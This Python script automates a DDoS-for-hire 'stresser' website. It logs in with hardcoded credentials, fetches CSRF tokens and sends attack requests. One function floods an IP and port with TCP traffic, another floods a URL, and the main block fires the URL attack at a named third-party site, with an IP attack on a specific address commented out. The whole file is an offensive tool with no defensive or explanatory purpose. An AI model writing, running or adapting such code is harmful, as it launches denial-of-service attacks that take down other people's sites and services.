# -*- coding:utf-8 -*-
# @time     : 2022-07-11 13:24:35
# @File     : cryptostresser.py
# @Author   : Twoyear
# @url      : https://cryptostresser.com/
import requests
import json


class Cryptostresser:
    def __init__(self):
        self.requs = requests.session()
        self.requs.headers = {
            'authority': 'cryptostresser.com',
            'accept': 'text/plain, */*; q=0.01',
            'accept-language': 'zh-CN,zh;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://cryptostresser.com/attack?page=1',
            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        self.get_home()
        self.login()

    def get_home(self):
        self.requs.get("https://cryptostresser.com/")

    def get_scrf(self):
        '''
        获取scrf
        :return:
        '''
        url = "https://cryptostresser.com/backend/ajax/csrf"
        scrf = self.requs.get(url).text
        return scrf

    def login(self):
        '''
        登录
        :return:
        '''
        self.get_scrf()
        url = "https://cryptostresser.com/backend/ajax/user"
        payload = json.dumps({
            "action": "login",
            "username": "twoyear",
            "password": "twoyear",
            "token": self.get_scrf()
        })
        self.requs.post(url, data=payload)

    def hurt_ip(self, dizhi="", port=0):
        '''
        IP_Hurt
        :return:
        '''
        url = "https://cryptostresser.com/backend/ajax/attack"
        payload = json.dumps({
            "token": self.get_scrf(),
            "action": "send",
            "attack_target": str(dizhi),
            "attack_time": "120",
            "attack_port": str(port),
            "attack_method": "FREETCP",
            "simultaneous_attacks": "1",
            "request_method": "GET",
            "post_data": "",
            "ratelimit": "0",
            "user_agent": "all",
            "custom_ua": "",
            "attack_origin": None,
            "response_size": "all",
            "cookies": "",
            "referrer": "",
            "source_ip": "",
            "host_header": ""
        })

        hurt = self.requs.post(url, data=payload)
        return hurt.json()

    def hurt_url(self, url=""):
        '''
        Url_Hurt
        :return:
        '''
        payload = json.dumps({
            "token": self.get_scrf(),
            "action": "send",
            "attack_target": url,
            "attack_time": "300",
            "attack_method": "FREESPAM",
            "simultaneous_attacks": "1",
            "request_method": "GET",
            "post_data": "",
            "ratelimit": "0",
            "user_agent": "all",
            "custom_ua": "",
            "attack_origin": "null",
            "response_size": "all",
            "cookies": "",
            "referrer": "",
            "source_ip": "",
            "host_header": ""
        })
        url = "https://cryptostresser.com/backend/ajax/attack"
        hurt = self.requs.post(url, data=payload)
        return hurt.json()


if __name__ == '__main__':
    Crypto = Cryptostresser()
    # task = Crypto.hurt_ip("8.130.26.206",80)
    task = Crypto.hurt_url("http://www.yysh.live/")
    print(task)
